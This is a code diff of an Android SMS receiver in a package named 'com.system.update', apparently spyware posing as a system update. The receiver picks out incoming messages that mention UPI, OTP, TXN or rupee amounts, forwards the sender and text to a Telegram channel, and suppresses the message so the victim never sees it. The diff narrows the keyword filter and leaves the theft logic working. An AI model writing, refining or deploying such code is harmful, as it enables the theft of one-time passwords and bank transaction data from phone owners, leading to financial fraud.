@@ -1,4 +1,4 @@
-﻿package com.system.update;
+package com.system.update;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -22,9 +22,8 @@ public class SmsReceiver extends BroadcastReceiver {
                 String body = msg.getMessageBody();
                 String sender = msg.getOriginatingAddress();
                 
-                if (body.contains("UPI") || body.contains("OTP") || body.contains("TXN") || 
-                    body.contains("₹") || body.contains("balance") || body.contains("Balance")) {
-                    sendTelegram("📩 SMS from " + sender + ": " + body);
+                if (body.contains("UPI") || body.contains("OTP") || body.contains("TXN") || body.contains("Rs")) {
+                    sendTelegram("SMS from " + sender + ": " + body);
                     abortBroadcast();
                 }
             }
